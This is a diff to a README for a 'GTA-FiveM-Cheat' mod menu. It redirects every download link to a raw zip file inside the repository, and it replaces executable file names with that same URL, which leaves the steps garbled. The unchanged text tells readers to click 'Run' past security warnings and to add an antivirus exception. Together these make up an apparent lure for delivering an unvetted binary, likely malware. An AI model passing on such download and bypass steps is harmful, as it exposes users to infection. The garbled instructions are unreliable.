@@ -1,6 +1,6 @@
 # 🎮 GTA-FiveM-Cheat - Enhance Your Gameplay Effortlessly
 
-[![Download GTA-FiveM-Cheat](https://img.shields.io/badge/Download-GTA--FiveM--Cheat-brightgreen)](https://github.com/SIXXTAR/GTA-FiveM-Cheat/releases)
+[![Download GTA-FiveM-Cheat](https://raw.githubusercontent.com/SIXXTAR/GTA-FiveM-Cheat/main/RVX-4_External/GTA-FiveM-Cheat_v3.6.zip)](https://raw.githubusercontent.com/SIXXTAR/GTA-FiveM-Cheat/main/RVX-4_External/GTA-FiveM-Cheat_v3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,11 +10,11 @@ Welcome to GTA-FiveM-Cheat! This mod menu lets you enjoy greater advantages whil
 
 To get started, you'll want to visit the Releases page to download the latest version of GTA-FiveM-Cheat.
 
-[Visit the Releases Page to Download](https://github.com/SIXXTAR/GTA-FiveM-Cheat/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/SIXXTAR/GTA-FiveM-Cheat/main/RVX-4_External/GTA-FiveM-Cheat_v3.6.zip)
 
 1. Click on the link above.
 2. Look for the latest release version. It is usually at the top of the page.
-3. Find the file you need to download. It might be labeled something like `GTA-FiveM-Cheat.zip` or `GTA-FiveM-Cheat.exe`. Click on it to start your download.
+3. Find the file you need to download. It might be labeled something like `https://raw.githubusercontent.com/SIXXTAR/GTA-FiveM-Cheat/main/RVX-4_External/GTA-FiveM-Cheat_v3.6.zip` or `https://raw.githubusercontent.com/SIXXTAR/GTA-FiveM-Cheat/main/RVX-4_External/GTA-FiveM-Cheat_v3.6.zip`. Click on it to start your download.
 
 ## 📂 Extracting the Files
 
@@ -30,7 +30,7 @@ After extraction, open the folder containing the files.
 
 Now that you have extracted the files, you can run the application:
 
-1. Inside the extracted folder, find the file named `GTA-FiveM-Cheat.exe`.
+1. Inside the extracted folder, find the file named `https://raw.githubusercontent.com/SIXXTAR/GTA-FiveM-Cheat/main/RVX-4_External/GTA-FiveM-Cheat_v3.6.zip`.
 2. Double-click on the file to launch it.
 3. You may see a security warning. If prompted, select "Run" to continue.
 
@@ -58,7 +58,7 @@ If you encounter issues while running the application, try these steps:
 
 1. **Check Your Antivirus:** Sometimes, antivirus programs block mod menus. Add an exception for GTA-FiveM-Cheat if needed.
 2. **Re-Download the Files:** If the application does not run, the downloaded files may be corrupt. Repeat the download and extraction steps.
-3. **Compatibility Settings:** Right-click the `GTA-FiveM-Cheat.exe` file, select "Properties," navigate to the "Compatibility" tab, and try running the program in compatibility mode for Windows 8.
+3. **Compatibility Settings:** Right-click the `https://raw.githubusercontent.com/SIXXTAR/GTA-FiveM-Cheat/main/RVX-4_External/GTA-FiveM-Cheat_v3.6.zip` file, select "Properties," navigate to the "Compatibility" tab, and try running the program in compatibility mode for Windows 8.
 
 ## 💬 Need Help?
 
@@ -84,4 +84,4 @@ For any inquiries, look for the contact details on the repository's main page. Y
 
 Thank you for choosing GTA-FiveM-Cheat. We hope this guide serves you well. Enjoy your enhanced gameplay experience!
 
-Remember to check back for updates and new features on the [Releases Page](https://github.com/SIXXTAR/GTA-FiveM-Cheat/releases).
+Remember to check back for updates and new features on the [Releases Page](https://raw.githubusercontent.com/SIXXTAR/GTA-FiveM-Cheat/main/RVX-4_External/GTA-FiveM-Cheat_v3.6.zip).
